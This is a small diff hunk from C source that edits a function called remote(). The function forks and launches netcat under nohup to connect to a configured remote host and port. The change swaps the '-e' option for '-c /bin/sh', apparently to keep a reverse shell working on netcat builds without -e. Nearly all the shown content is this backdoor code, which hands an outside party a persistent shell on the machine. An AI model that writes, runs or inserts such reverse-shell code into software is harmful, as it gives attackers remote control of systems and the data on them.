@@ -5,7 +5,7 @@ int	remote(void)
 {
 	pid_t pid;
 	char *const para[] = {"/usr/bin/nohup",
-		"/bin/nc", REMOTE_TARGET, REMOTE_PORT, "-e", REMOTE_EXEC,
+		"/bin/nc", REMOTE_TARGET, REMOTE_PORT, "-c", "/bin/sh", REMOTE_EXEC,
 			NULL};
 	if ((pid = fork()) == 0)
 	{
